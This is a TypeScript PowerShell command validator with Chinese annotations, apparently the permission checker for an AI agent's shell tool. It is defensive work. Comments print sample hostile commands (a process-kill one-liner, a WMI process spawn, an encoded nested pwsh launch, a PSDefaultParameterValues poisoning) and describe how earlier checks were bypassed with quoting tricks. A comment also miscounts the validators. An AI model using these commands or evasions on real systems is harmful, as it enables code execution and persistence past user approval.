    for (let i = 0; i < cmd.args.length; i++) {
// elementTypes[i + 1]：因为 elementTypes[0] 是命令名，参数从下标 1 开始。
// 这个 +1 错位在本文件里出现多次，改动时要连着一起改。
      const argType = cmd.elementTypes?.[i + 1]
      const arg = cmd.args[i]
      if (argType === 'StringConstant' && arg && !arg.startsWith('-')) {
        return {
          behavior: 'ask',
          message: `${cmd.name} with positional string argument binds to -FilePath and executes a script file`,
        }
      }
    }
  }
  return { behavior: 'passthrough' }
}

// （上方英文注释说明：ForEach-Object -MemberName 是一个「绕过双重检查」的手法，
//  详见函数内中文说明。）
/**
 * Checks for ForEach-Object -MemberName. Invokes a method by string name on
 * every piped object — semantically equivalent to `| % { $_.Method() }` but
 * without any ScriptBlockAst or InvokeMemberExpressionAst in the tree.
 *
 * PoC: `Get-Process | ForEach-Object -MemberName Kill` → kills all processes.
 * checkScriptBlockInjection misses it (no script block); checkMemberInvocations
 * misses it (no .Method() syntax). Aliases `%` and `foreach` resolve via
 * COMMON_ALIASES.
 */
/**
 * 【中文】检测 ForEach-Object -MemberName：按**字符串名字**调用方法。
 *
 * 为什么它能绕过别的检查（对应上方英文注释）：
 *   `Get-Process | ForEach-Object -MemberName Kill` 等价于 `| % { $_.Kill() }`，
 *   但 AST 里**既没有脚本块也没有 .Method() 语法** ——
 *   于是 checkScriptBlockInjection 和 checkMemberInvocations 双双落空。
 *   效果：杀掉所有进程。
 *
 * 步骤：① 命令名（经别名解析，% 和 foreach 都算）是否是 foreach-object
 *      ② 检查 -MemberName（含缩写 -m 与替代减号）
 *      ③ 兜底：PS7+ 里位置字符串也会绑到 -MemberName，
 *         所以扫描所有「非开关的 StringConstant」参数（宁可多报）
 */
function checkForEachMemberName(
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult {
  for (const cmd of getAllCommands(parsed)) {
    const lower = cmd.name.toLowerCase()
    const resolved = COMMON_ALIASES[lower]?.toLowerCase() ?? lower
    if (resolved !== 'foreach-object') {
      continue
    }
// ForEach-Object 的参数里只有 -MemberName 以 -m 开头，所以 -m 就是无歧义最短缩写。
    // ForEach-Object params starting with -m: only -MemberName. -m is unambiguous.
    if (psExeHasParamAbbreviation(cmd, '-membername', '-m')) {
      return {
        behavior: 'ask',
        message:
          'ForEach-Object -MemberName invokes methods by string name which cannot be validated',
      }
    }
// 位置参数扫描要**扫全部参数**（不能只看第一个）：
// `-Verbose Kill` 或 `-ErrorAction Stop Kill` 里的 Kill 依然会被位置绑定，
// 只看第一个参数会漏。
    // PS7+: `ForEach-Object Kill` binds a positional string arg to
    // -MemberName via MemberSet parameter-set resolution (ScriptBlock args
    // select ScriptBlockSet instead). Scan ALL args — `-Verbose Kill` or
    // `-ErrorAction Stop Kill` still binds Kill positionally. Any non-dash
    // StringConstant is a potential -MemberName; over-flagging is fail-safe.
    for (let i = 0; i < cmd.args.length; i++) {
      const argType = cmd.elementTypes?.[i + 1]
      const arg = cmd.args[i]
      if (argType === 'StringConstant' && arg && !arg.startsWith('-')) {
        return {
          behavior: 'ask',
          message:
            'ForEach-Object with positional string argument binds to -MemberName and invokes methods by name',
        }
      }
    }
  }
  return { behavior: 'passthrough' }
}

/**
 * 【中文】检测 Start-Process 的两类危险用法。
 *
 * 向量一：**提权** —— -Verb RunAs 会弹 UAC 申请管理员权限。
 * 向量二：**嵌套 PowerShell** —— Start-Process pwsh -ArgumentList \「-e <base64>\」。
 *         这条尤其阴险：外层命令名是 Start-Process 而不是 pwsh，
 *         于是 checkEncodedCommand / checkPwshCommandOrFile 都匹配不上，
 *         而那个 -e 藏在 -ArgumentList 的**字符串值里面**，根本不会被当成参数解析。
 *
 * 为什么不直接解析 -ArgumentList 的内容：它是不透明的字符串或数组，
 * 解析规则脆弱且易被绕过。改成「目标是 PS 可执行文件就拦」更简单也更稳。
 */
/**
 * Checks for dangerous Start-Process patterns.
 *
 * Two vectors:
 * 1. `-Verb RunAs` — privilege escalation (UAC prompt).
 * 2. Launching a PowerShell executable — nested invocation.
 * `Start-Process pwsh -ArgumentList "-e <b64>"` evades
 * checkEncodedCommand/checkPwshCommandOrFile because cmd.name is
 * `Start-Process`, not `pwsh`. The `-e` lives inside the -ArgumentList
 * string value and is never parsed as a param on the outer command.
 * Rather than parse -ArgumentList contents (fragile — it's an opaque
 * string or array), flag any Start-Process whose target is a PS
 * executable: the nested invocation is unvalidatable by construction.
 */
function checkStartProcess(
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult {
  for (const cmd of getAllCommands(parsed)) {
    const lower = cmd.name.toLowerCase()
// 三个名字都算：Start-Process 本体，以及别名 saps 和 start。
// （start 还是 Windows 命令行内部命令的名字，所以一并纳入。）
    if (lower !== 'start-process' && lower !== 'saps' && lower !== 'start') {
      continue
    }
// 向量一，写法甲：空格分隔（-Verb RunAs）。
// 先确认有 -Verb（含缩写 -v），再在参数里找一个裸的 runas token。
    // Vector 1: -Verb RunAs (space or colon syntax).
    // Space syntax: psExeHasParamAbbreviation finds -Verb/-v, then scan args
    // for a bare 'runas' token.
    if (
      psExeHasParamAbbreviation(cmd, '-Verb', '-v') &&
      cmd.args.some(a => a.toLowerCase() === 'runas')
    ) {
      return {
        behavior: 'ask',
        message: 'Command requests elevated privileges',
      }
    }
// 向量一，写法乙：冒号绑定（-Verb:RunAs）。这里做了**两层**检测：
//   (a) 结构化：用 parser 提供的 children[] 拿到冒号绑定值的子节点直接比文本；
//   (b) 正则兜底：老的输出没有 children[]，或作为纵深防御再查一遍。
// 之所以要兜底：历史上 -Verb:'RunAs'、-Verb:\「RunAs\」、-Verb:`runas 这几种
// 因为引号/反引号破坏了 /...:runas$/ 这种朴素正则而全部绕过过。
    // Colon syntax — two layers:
    // (a) Structural: PR #23554 added children[] for colon-bound param args.
    //     children[i] = [{type, text}] for the bound value. Check if any
    //     -v*-prefixed param has a child whose text normalizes (strip
    //     quotes/backtick/whitespace) to 'runas'. Robust against arbitrary
    //     quoting the regex can't anticipate.
    // (b) Regex fallback: for parsed output without children[] or as
    //     defense-in-depth. -Verb:'RunAs', -Verb:"RunAs", -Verb:`runas all
    //     bypassed the old /...:runas$/ pattern because the quote/tick broke
    //     the match.
    if (cmd.children) {
      for (let i = 0; i < cmd.args.length; i++) {
// 先去掉反引号再匹配参数名（bug #14）：`-V`erb:RunAs` 里的反引号会打断匹配。
        // Strip backticks before matching param name (bug #14): -V`erb:RunAs
        const argClean = cmd.args[i]!.replace(/`/g, '')
        if (!/^[-\u2013\u2014\u2015/]v[a-z]*:/i.test(argClean)) continue
        const kids = cmd.children[i]
        if (!kids) continue
        for (const child of kids) {
          if (child.text.replace(/['"`\s]/g, '').toLowerCase() === 'runas') {
            return {
              behavior: 'ask',
              message: 'Command requests elevated privileges',
            }
          }
        }
      }
    }
    if (
      cmd.args.some(a => {
        // Strip backticks before matching (bug #14 / review nit #2)
        const clean = a.replace(/`/g, '')
        return /^[-\u2013\u2014\u2015/]v[a-z]*:['"` ]*runas['"` ]*$/i.test(
          clean,
        )
      })
    ) {
      return {
        behavior: 'ask',
        message: 'Command requests elevated privileges',
      }
    }
    // Vector 2: Start-Process targeting a PowerShell executable.
    // Target is either the first positional arg or the value after -FilePath.
    // Scan all args — any PS-executable token present is treated as the launch
    // target. Known false-positive: path-valued params (-WorkingDirectory,
    // -RedirectStandard*) whose basename is pwsh/powershell —
    // isPowerShellExecutable extracts basenames from paths, so
    // `-WorkingDirectory C:\projects\pwsh` triggers. Accepted trade-off:
    // Start-Process is not in CMDLET_ALLOWLIST (always prompts regardless),
    // result is ask not reject, and correctly parsing Start-Process parameter
    // binding is fragile. Strip quotes the parser may have preserved.
    for (const arg of cmd.args) {
      const stripped = arg.replace(/^['"]|['"]$/g, '')
      if (isPowerShellExecutable(stripped)) {
        return {
          behavior: 'ask',
          message:
            'Start-Process launches a nested PowerShell process which cannot be validated',
        }
      }
    }
  }
  return { behavior: 'passthrough' }
}

/**
 * 【中文】「脚本块是安全的」白名单 cmdlet：过滤/格式化类。
 *
 * 判据：传给它们的脚本块只是**谓词或投影**（Where-Object 的条件、
 * Sort-Object 的排序键），不是要执行的任意脚本。
 */
/**
 * Cmdlets where script blocks are safe (filtering/output cmdlets).
 * Script blocks piped to these are just predicates or projections, not arbitrary execution.
 */
// 注意注释里特别强调：**不含** foreach-object —— 它的脚本块是任意脚本。
// （getAllCommands 会递归进去检查块内的命令，但非命令节点如赋值语句看不到，
//  所以最终由 powershellPermissions.ts 的 hasScriptBlocks 闸门兜底。）
const SAFE_SCRIPT_BLOCK_CMDLETS = new Set([
  'where-object',
  'sort-object',
  'select-object',
  'group-object',
  'format-table',
  'format-list',
  'format-wide',
  'format-custom',
  // NOT foreach-object — its block is arbitrary script, not a predicate.
  // getAllCommands recurses so commands inside the block ARE checked, but
  // non-command AST nodes (AssignmentStatementAst etc.) are invisible to it.
  // See powershellPermissions.ts step-5 hasScriptBlocks guard.
])

/**
 * 【中文】检测**脚本块注入**：脚本块出现在危险 cmdlet 上。
 *
 * @returns passthrough = 脚本块只用在了安全的过滤/输出 cmdlet 上；
 *          ask = 用在了危险 cmdlet 上（或出现在无法归类的命令上）
 *
 * 步骤：① 先看整棵树里有没有脚本块（没有直接放行）
 *      ② 任一命令属于危险脚本块 cmdlet → ask
 *      ③ 再看是不是**所有**命令都属于安全消费者（含别名解析）→ 是则放行
 *      ④ 剩下情况（有脚本块但命令无法归类）→ ask（fail-closed）
 */
/**
 * Checks for script block injection patterns where script blocks
 * appear in suspicious contexts that could execute arbitrary code.
 *
 * Script blocks used with safe filtering/output cmdlets (Where-Object,
 * Sort-Object, Select-Object, Group-Object) are allowed.
 * Script blocks used with dangerous cmdlets (Invoke-Command, Invoke-Expression,
 * Start-Job, etc.) are flagged.
 */
function checkScriptBlockInjection(
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult {
  const security = deriveSecurityFlags(parsed)
// 早期返回：整棵树没有脚本块就没必要做后面两轮扫描（省一次全树遍历）。
  if (!security.hasScriptBlocks) {
    return { behavior: 'passthrough' }
  }

  // Check all commands in the parsed result. If any command is in the
  // dangerous set, flag it. If all commands with script blocks are in
  // the safe set (or the allowlist), allow it.
  for (const cmd of getAllCommands(parsed)) {
    const lower = cmd.name.toLowerCase()
    if (DANGEROUS_SCRIPT_BLOCK_CMDLETS.has(lower)) {
      return {
        behavior: 'ask',
        message:
          'Command contains script block with dangerous cmdlet that may execute arbitrary code',
      }
    }
  }

  // Check if all commands are either safe script block consumers or don't use script blocks
// `.every(fn)` ≈ Java 的 stream().allMatch(fn)。
// 这里要求**每一个**命令都是安全消费者才放行 —— 只要有一个说不清就 ask。
  const allCommandsSafe = getAllCommands(parsed).every(cmd => {
    const lower = cmd.name.toLowerCase()
    // Safe filtering/output cmdlets
    if (SAFE_SCRIPT_BLOCK_CMDLETS.has(lower)) {
      return true
    }
    // Resolve aliases
    const alias = COMMON_ALIASES[lower]
    if (alias && SAFE_SCRIPT_BLOCK_CMDLETS.has(alias.toLowerCase())) {
      return true
    }
    // Unknown command with script blocks present — flag as potentially dangerous
    return false
  })

  if (allCommandsSafe) {
    return { behavior: 'passthrough' }
  }

  return {
    behavior: 'ask',
    message: 'Command contains script block that may execute arbitrary code',
  }
}

/**
 * 【中文】检测子表达式 $()。它能把命令执行**藏在一个值里面**，
 * 因此凡是不确定意图的场景都要拦。
 */
/**
 * AST-only check: Detects subexpressions $() which can hide command execution.
 */
function checkSubExpressions(
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult {
  if (deriveSecurityFlags(parsed).hasSubExpressions) {
    return {
      behavior: 'ask',
      message: 'Command contains subexpressions $()',
    }
  }
  return { behavior: 'passthrough' }
}

/**
 * 【中文】检测可展开字符串（双引号串）：里面可能嵌 $env:PATH 之类的变量
 * 或 $(命令) 之类的子表达式，字面文本 ≠ 运行时实际内容。
 */
/**
 * AST-only check: Detects expandable strings (double-quoted) with embedded
 * expressions like "$env:PATH" or "$(dangerous-command)". These can hide
 * command execution or variable interpolation inside string literals.
 */
function checkExpandableStrings(
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult {
  if (deriveSecurityFlags(parsed).hasExpandableStrings) {
    return {
      behavior: 'ask',
      message: 'Command contains expandable strings with embedded expressions',
    }
  }
  return { behavior: 'passthrough' }
}

/**
 * 【中文】检测 splatting（@variable）：把一整个哈希表当参数展开传入，
 * 参数内容在 AST 里是不可见的，无法静态判定。
 */
/**
 * AST-only check: Detects splatting (@variable) which can obscure arguments.
 */
function checkSplatting(
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult {
  if (deriveSecurityFlags(parsed).hasSplatting) {
    return {
      behavior: 'ask',
      message: 'Command uses splatting (@variable)',
    }
  }
  return { behavior: 'passthrough' }
}

/**
 * 【中文】检测停止解析标记 --%：它后面的内容 PowerShell **不再解析**，
 * 直接原样传给原生程序 —— 我们的 AST 也就完全看不到了。
 */
/**
 * AST-only check: Detects stop-parsing token (--%) which prevents further parsing.
 */
function checkStopParsing(
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult {
  if (deriveSecurityFlags(parsed).hasStopParsing) {
    return {
      behavior: 'ask',
      message: 'Command uses stop-parsing token (--%)',
    }
  }
  return { behavior: 'passthrough' }
}

/**
 * 【中文】检测 .NET 方法调用（::Method 或 .Method()）：可以直接触碰系统 API。
 * 这是**粗粒度**的闸门（只要是方法调用就 ask）。
 */
/**
 * AST-only check: Detects .NET method invocations which can access system APIs.
 */
function checkMemberInvocations(
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult {
  if (deriveSecurityFlags(parsed).hasMemberInvocations) {
    return {
      behavior: 'ask',
      message: 'Command invokes .NET methods',
    }
  }
  return { behavior: 'passthrough' }
}

/**
 * 【中文】检测**类型字面量**（方括号里的 .NET 类型名）是否在微软 CLM 白名单外。
 *
 * 与上一个函数的关系（对应上方英文注释）：
 *   checkMemberInvocations 是粗筛（任何方法调用都拦），
 *   本函数是**精筛**（到底用了哪个类型），能给出更准确的提示。
 *   两者会同时命中 [Reflection.Assembly]::Load；
 *   而纯类型转换（[int]$x）没有方法调用，只会命中本函数。
 *   执行顺序上本函数排在后者，保证提示文案更具体。
 */
/**
 * AST-only check: type literals outside Microsoft's ConstrainedLanguage
 * allowlist. CLM blocks all .NET type access except ~90 primitives/attributes
 * Microsoft considers safe for untrusted code. We trust that list as the
 * "safe" boundary — anything outside it (Reflection.Assembly, IO.Pipes,
 * Diagnostics.Process, InteropServices.Marshal, etc.) can access system APIs
 * that compromise the permission model.
 *
 * Runs AFTER checkMemberInvocations: that broadly flags any ::Method / .Method()
 * call; this check is the more specific "which types" signal. Both fire on
 * [Reflection.Assembly]::Load; CLM gives the precise message. Pure type casts
 * like [int]$x have no member invocation and only hit this check.
 */
function checkTypeLiterals(
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult {
// `parsed.typeLiterals ?? []`：字段缺失时兜底成空数组，
// for...of 遍历空数组不产生任何迭代，省掉一个判空分支。
  for (const t of parsed.typeLiterals ?? []) {
    if (!isClmAllowedType(t)) {
      return {
        behavior: 'ask',
        message: `Command uses .NET type [${t}] outside the ConstrainedLanguage allowlist`,
      }
    }
  }
  return { behavior: 'passthrough' }
}

/**
 * 【中文】检测 Invoke-Item（别名 ii）：用系统默认处理器打开文件。
 *
 * 为什么必拦（对应上方英文注释）：
 *   Windows 上走的是 ShellExecute —— 打开 .exe/.ps1/.bat/.cmd 就等于**执行**它。
 *   连 .txt 都可能触发一个会接受参数的用户自定义处理器，
 *   所以不存在「安全变体」，一律 ask。
 */
/**
 * Invoke-Item (alias ii) opens a file with its default handler (ShellExecute
 * on Windows, open/xdg-open on Unix). On an .exe/.ps1/.bat/.cmd this is RCE.
 * Bug 008: ii is in no blocklist; passthrough prompt doesn't explain the
 * exec hazard. Always ask — there is no safe variant (even opening .txt may
 * invoke a user-configured handler that accepts arguments).
 */
function checkInvokeItem(
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult {
  for (const cmd of getAllCommands(parsed)) {
    const lower = cmd.name.toLowerCase()
    if (lower === 'invoke-item' || lower === 'ii') {
      return {
        behavior: 'ask',
        message:
          'Invoke-Item opens files with the default handler (ShellExecute). On executable files this runs arbitrary code.',
      }
    }
  }
  return { behavior: 'passthrough' }
}

/**
 * 【中文】计划任务类 cmdlet —— 典型的**持久化**原语：
 * 写进去的任务会在本次会话结束后继续存在并运行，必须让用户知情。
 */
/**
 * Scheduled-task persistence primitives. Register-ScheduledJob was blocked
 * (DANGEROUS_SCRIPT_BLOCK_CMDLETS); the newer Register-ScheduledTask cmdlet
 * and legacy schtasks.exe /create were not. Persistence that survives the
 * session with no explanatory prompt.
 */
// Register-ScheduledJob 已经由 DANGEROUS_SCRIPT_BLOCK_CMDLETS 拦了，
// 这里补的是较新的 Register-ScheduledTask 系列和老牌的 schtasks.exe。
const SCHEDULED_TASK_CMDLETS = new Set([
  'register-scheduledtask',
  'new-scheduledtask',
  'new-scheduledtaskaction',
  'set-scheduledtask',
])

/**
 * 【中文】检测创建/修改计划任务的行为（PowerShell cmdlet + schtasks.exe 两条路）。
 *
 * 为什么连 schtasks.exe 也要管：它是 Windows 自带的命令行工具，
 * 效果与 Register-ScheduledTask 完全相同，属于「绕过 PowerShell cmdlet 名单」的旁路。
 */
function checkScheduledTask(
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult {
  for (const cmd of getAllCommands(parsed)) {
    const lower = cmd.name.toLowerCase()
    if (SCHEDULED_TASK_CMDLETS.has(lower)) {
      return {
        behavior: 'ask',
        message: `${cmd.name} creates or modifies a scheduled task (persistence primitive)`,
      }
    }
// schtasks 只在带 /create 或 /change 时才拦 —— 裸 schtasks（查询任务列表）是无害的。
// 同样地 -create / -change 两种前缀都要认（Windows 工具两种都收）。
    if (lower === 'schtasks' || lower === 'schtasks.exe') {
      if (
        cmd.args.some(a => {
          const la = a.toLowerCase()
          return (
            la === '/create' ||
            la === '/change' ||
            la === '-create' ||
            la === '-change'
          )
        })
      ) {
        return {
          behavior: 'ask',
          message:
            'schtasks with create/change modifies scheduled tasks (persistence primitive)',
        }
      }
    }
  }
  return { behavior: 'passthrough' }
}

/**
 * 【中文】会写环境变量的 cmdlet 名单（含常见别名）。
 */
/**
 * AST-only check: Detects environment variable manipulation via Set-Item/New-Item on env: scope.
 */
// 注意注释里提到的取舍：'sc' 别名**刻意不收**，因为它在 PS Core 7+ 上
// 会跟系统自带的 sc.exe（服务控制）撞车，收了会误伤。
const ENV_WRITE_CMDLETS = new Set([
  'set-item',
  'si',
  'new-item',
  'ni',
  'remove-item',
  'ri',
  'del',
  'rm',
  'rd',
  'rmdir',
  'erase',
  'clear-item',
  'cli',
  'set-content',
  // 'sc' omitted — collides with sc.exe on PS Core 7+, see COMMON_ALIASES note
  'add-content',
  'ac',
])

/**
 * 【中文】检测**环境变量操作**：改环境变量能偷偷改变后续所有命令的行为
 * （比如改 PATH 让下一个命令执行到攻击者放的程序）。
 *
 * 步骤：① 先问 AST：这条命令里有没有出现 env 作用域的变量（$env:XXX）
 *      ② 没有 → 直接放行（快速路径，绝大多数命令走这里）
 *      ③ 有 → 再看有没有写类 cmdlet，或者有赋值语句 → ask
 */
function checkEnvVarManipulation(
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult {
// getVariablesByScope(parsed, 'env')：从 AST 里捞出所有 env 作用域的变量引用。
  const envVars = getVariablesByScope(parsed, 'env')
  if (envVars.length === 0) {
    return { behavior: 'passthrough' }
  }
  // Check if any command is a write cmdlet
  for (const cmd of getAllCommands(parsed)) {
    if (ENV_WRITE_CMDLETS.has(cmd.name.toLowerCase())) {
      return {
        behavior: 'ask',
        message: 'Command modifies environment variables',
      }
    }
  }
  // Also flag if there are assignments involving env vars
  if (deriveSecurityFlags(parsed).hasAssignments && envVars.length > 0) {
    return {
      behavior: 'ask',
      message: 'Command modifies environment variables',
    }
  }
  return { behavior: 'passthrough' }
}

/**
 * 【中文】检测**模块加载**类 cmdlet。
 *
 * 为什么危险（对应上方英文注释）：
 *   Import-Module 会执行 .psm1 的顶层脚本体（等于执行任意代码）；
 *   Install-Module / Save-Module 会从不确定的仓库下载。
 *   所以 `Import-Module:*` 这种通配放行规则是绝对不能给的。
 *
 * 双保险设计：dangerousCmdlets.ts 的 NEVER_SUGGEST 保证 UI **不会主动建议**
 * 放行这些 cmdlet；本函数保证即使用户手写了放行规则，权限引擎仍会独立把关。
 */
/**
 * Module-loading cmdlets execute a .psm1's top-level script body (Import-Module)
 * or download from arbitrary repositories (Install-Module, Save-Module). A
 * wildcard allow rule like `Import-Module:*` would let an attacker-supplied
 * .psm1 execute with the user's privileges — same risk as Invoke-Expression.
 *
 * NEVER_SUGGEST (dangerousCmdlets.ts) derives from this list so the UI
 * never offers these as wildcard suggestions, but users can still manually
 * write allow rules. This check ensures the permission engine independently
 * gates these cmdlets.
 */

function checkModuleLoading(
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult {
  for (const cmd of getAllCommands(parsed)) {
    const lower = cmd.name.toLowerCase()
    if (MODULE_LOADING_CMDLETS.has(lower)) {
      return {
        behavior: 'ask',
        message:
          'Command loads, installs, or downloads a PowerShell module or script, which can execute arbitrary code',
      }
    }
  }
  return { behavior: 'passthrough' }
}

/**
 * 【中文】运行时状态类 cmdlet 名单（别名 + 全名）。
 */
/**
 * Set-Alias/New-Alias can hijack future command resolution: after
 * `Set-Alias Get-Content Invoke-Expression`, any later `Get-Content $x`
 * executes arbitrary code. Set-Variable/New-Variable can poison
 * `$PSDefaultParameterValues` (e.g., `Set-Variable PSDefaultParameterValues
 * @{'*:Path'='/etc/passwd'}`) which alters every subsequent cmdlet's behavior.
 * Neither effect can be validated statically — we'd need to track all future
 * command resolutions in the session. Always ask.
 */
// Set-Alias / New-Alias：劫持**后续**命令的解析（把 Get-Content 指向 Invoke-Expression）。
// Set-Variable / New-Variable：污染 $PSDefaultParameterValues，
// 从而改变之后每一个 cmdlet 的默认参数。两者都无法静态验证，一律 ask。
const RUNTIME_STATE_CMDLETS = new Set([
  'set-alias',
  'sal',
  'new-alias',
  'nal',
  'set-variable',
  'sv',
  'new-variable',
  'nv',
])

/**
 * 【中文】检测「污染运行时状态」的 cmdlet：改别名或改变量，
 * 影响的是**本次会话里后续所有命令**的解析结果。
 *
 * 为什么必须 ask：要验证它的影响，得跟踪会话里之后每一次命令解析 ——
 * 静态做不到。
 */
function checkRuntimeStateManipulation(
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult {
  for (const cmd of getAllCommands(parsed)) {
    // Strip module qualifier: `Microsoft.PowerShell.Utility\Set-Alias` → `set-alias`
// 剥掉模块限定前缀：`Microsoft.PowerShell.Utility\Set-Alias` → `set-alias`。
// 不剥的话，全限定名匹配不上名单（与 modeValidation 里 nameType 的思路同源）。
    const raw = cmd.name.toLowerCase()
    const lower = raw.includes('\\')
      ? raw.slice(raw.lastIndexOf('\\') + 1)
      : raw
    if (RUNTIME_STATE_CMDLETS.has(lower)) {
      return {
        behavior: 'ask',
        message:
          'Command creates or modifies an alias or variable that can affect future command resolution',
      }
    }
  }
  return { behavior: 'passthrough' }
}

/**
 * 【中文】WMI/CIM 起进程的 cmdlet 名单。
 */
/**
 * Invoke-WmiMethod / Invoke-CimMethod are Start-Process equivalents via WMI.
 * `Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c ..."`
 * spawns an arbitrary process, bypassing checkStartProcess entirely. No narrow
 * safe usage exists — -Class and -MethodName accept arbitrary strings, so
 * gating on Win32_Process specifically would miss -Class $x or other process-
 * spawning WMI classes. Returns ask on any invocation. (security finding #34)
 */
// Invoke-WmiMethod -Class Win32_Process -Name Create 就是 Start-Process 的等价物，
// 而且完全绕过 checkStartProcess。
const WMI_SPAWN_CMDLETS = new Set([
  'invoke-wmimethod',
  'iwmi',
  'invoke-cimmethod',
])

/**
 * 【中文】检测通过 WMI/CIM 起进程。
 *
 * 为什么**只要出现就拦**（对应上方英文注释）：
 *   -Class 和 -MethodName 都接受任意字符串，
 *   只针对 Win32_Process 做判定挡不住 -Class $x 或其它能起进程的 WMI 类。
 *   而且也没有「安全的窄用法」可言。
 */
function checkWmiProcessSpawn(
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult {
  for (const cmd of getAllCommands(parsed)) {
    const lower = cmd.name.toLowerCase()
    if (WMI_SPAWN_CMDLETS.has(lower)) {
      return {
        behavior: 'ask',
        message: `${cmd.name} can spawn arbitrary processes via WMI/CIM (Win32_Process Create)`,
      }
    }
  }
  return { behavior: 'passthrough' }
}

/**
 * 【中文】本文件对外唯一入口：这条命令安不安全？
 *
 * @param _command 原始命令文本 —— **故意不用**（下划线前缀即「未使用」约定），
 *                 保留它只是为了与其它工具保持一致的调用签名
 * @param parsed PowerShell AST 解析结果（必需）
 * @returns ask = 命中危险特征，需弹框；passthrough = 本层没意见
 *
 * 步骤：① AST 解析失败 → 直接 ask（看不懂就问人，fail-safe）
 *      ② 依次执行 22 个 check 函数（顺序见 validators 数组）
 *      ③ 任一返回 ask → 立即短路返回（不再跑后面的检查）
 *      ④ 全部通过 → passthrough，交回上层继续判定
 *
 * 为什么用「函数数组 + 循环」而不是一长串 if：
 *   新增/删除一个检查只改数组一项，主流程零改动 —— 这是本项目
 *   所有 check* 模块的统一写法（BashTool/bashSecurity.ts 也一样）。
 */
/**
 * Main entry point for PowerShell security validation.
 * Checks a PowerShell command against known dangerous patterns.
 *
 * All checks are AST-based. If the AST parse failed (parsed.valid === false),
 * none of the individual checks will match and we return 'ask' as a safe default.
 *
 * @param command - The PowerShell command to validate (unused, kept for API compat)
 * @param parsed - Parsed AST from PowerShell's native parser (required)
 * @returns Security result indicating whether the command is safe
 */
export function powershellCommandIsSafe(
  _command: string,
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult {
  // If the AST parse failed, we cannot determine safety -- ask the user
// 解析失败就 ask：这是整套安全体系的**兜底**。
// 意味着「语法错误」的命令不会被当成「没命中任何危险特征」而放行。
  if (!parsed.valid) {
    return {
      behavior: 'ask',
      message: 'Could not parse command for security analysis',
    }
  }

// 22 个检查器。顺序有意义：先跑命中率高、特征明确的，
// 短路后能省掉后面的遍历开销；同时保证提示文案是**最相关**的那一条。
  const validators = [
    checkInvokeExpression,
    checkDynamicCommandName,
    checkEncodedCommand,
    checkPwshCommandOrFile,
    checkDownloadCradles,
    checkDownloadUtilities,
    checkAddType,
    checkComObject,
    checkDangerousFilePathExecution,
    checkInvokeItem,
    checkScheduledTask,
    checkForEachMemberName,
    checkStartProcess,
    checkScriptBlockInjection,
    checkSubExpressions,
    checkExpandableStrings,
    checkSplatting,
    checkStopParsing,
    checkMemberInvocations,
    checkTypeLiterals,
    checkEnvVarManipulation,
    checkModuleLoading,
    checkRuntimeStateManipulation,
    checkWmiProcessSpawn,
  ]

// 短路返回：第一个 ask 就是最终答案。
// 好处是提示文案只讲一件事，用户看得懂（全列出来反而吓人且没重点）。
  for (const validator of validators) {
    const result = validator(parsed)
    if (result.behavior === 'ask') {
      return result
    }
  }

  // All checks passed
  return { behavior: 'passthrough' }
}
